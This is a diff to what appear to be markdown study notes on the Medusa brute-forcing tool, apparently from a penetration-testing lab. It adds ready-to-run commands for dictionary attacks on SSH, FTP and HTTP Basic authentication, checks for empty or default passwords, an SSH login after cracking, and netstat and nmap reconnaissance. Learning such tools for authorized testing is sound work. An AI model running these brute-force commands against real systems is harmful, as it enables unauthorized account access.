@@ -107,3 +107,19 @@ Command syntax to be used : `medusa [target_options] [credential_options] -M mod
 |Telnet|Telnet Protocol|Brute-forcing Telnet services for remote command execution on older systems.|`medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`|
 |VNC|Virtual Network Computing|Brute-forcing VNC login credentials for remote desktop access.|`medusa -M vnc -h 192.168.1.100 -P passwords.txt`|
 |Web Form|Brute-forcing Web Login Forms|Brute-forcing login forms on websites using HTTP POST requests.|`medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`|
+
+Command to launch a brute-force attack against SSH service on given IP Address : `medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh `
+
+Command to launch a Basic HTTP Authentication Attack : `medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET`
+
+Command to test for empty or default passwords : `medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name`
+
+## Web Services
+To login into SSH Service where username is given and password is brute-forced using dictionary : `medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3`
+
+Command for SSH to gain access : `ssh sshuser@<IP> -p PORT`
+Targeting FTP Server : `medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5` 
+
+### Expanding the Attack Surface
+To list all services and and open ports : `ntestat -tulpn | grep LISTEN`
+For further recon, we can use : `nmap localhost`
